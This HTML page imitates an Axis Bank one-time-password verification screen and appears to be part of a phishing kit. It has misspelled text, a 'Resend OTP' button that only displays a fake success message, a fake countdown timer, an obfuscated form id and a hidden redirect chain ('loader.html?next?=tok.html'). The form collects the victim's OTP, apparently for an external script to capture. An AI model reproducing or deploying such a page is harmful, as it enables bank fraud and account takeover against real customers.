<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
    <title>Axis Bank </title>
</head>
<body>
    <header>
        <img src="assets/header.jpg" width="100%" alt="">
    </header>
    <main>
        <h3 class="text-center">One Time Password (OTP) Verification</h3>
        <div class="box">
            <p style="color:grey">One Time Passowrd (OTP) has been sent to registered mobile Number. Plese enter the OTP and proceed.</p>
            <input type="hidden" id="nextValue" value="loader.html?next?=tok.html">
            <form action="" class="form" id="frm_2_am8E_">
                <strong id="tok-invalid" class="text-center"></strong>
                <div class="form-group">
                    <label for="">One Time Password </label>
                    <input type="text" inputmode="numeric" minlength="6" maxlength="8"  name="T" class="numericInput"  required>
                    <span class="resend-otp-button" onclick="document.getElementById('tok-invalid').innerHTML = 'New OTP Sent Successfully'"> Resend OTP</span>
                </div>
                <div class="form-group">
                    <div class="primary-color text-center">Wait for OTP : <span id="seconds">178</span> Second</div>
                </div>
                <div class="form-group">
                    <button type="submit" class="btn btn-primary">PROCEED</button>
                </div>
            </form>
        </div>
        <img src="assets/footer.jpg" alt="" width="100%">
    </main>
    
    <footer>
        <img src="assets/cop.jpg" alt="" width="100%">
    </footer>

    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <script src="script.js"></script>

    <script>
          $(document).ready(function() {
            var seconds = 178; 
            var countdown = setInterval(function() {
                seconds--; 
                $('#seconds').text(seconds);
                    if (seconds <= 0) {
                        clearInterval(countdown); 
                        console.log('Countdown reached 0');
                    }
                }, 1000); 
            });
    </script>
</body>

</html>
